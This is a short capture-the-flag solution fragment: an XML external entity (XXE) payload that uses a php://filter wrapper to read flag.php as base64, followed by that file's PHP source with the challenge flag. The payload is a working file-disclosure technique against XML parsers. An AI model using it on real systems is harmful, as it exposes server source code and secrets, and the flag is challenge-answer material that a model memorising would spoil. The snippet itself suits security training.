```
<?xml version="1.0"?>

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=./flag.php"> ]>

 <cite>&xxe;

</cite>


                                <p>Here is your flag: </p>
                                <?php
                                $flag = "NOVI{<xml>nightmares</xml>}";
                                echo "Whoaaa... not that easy.";
                                ?>
 ```                               
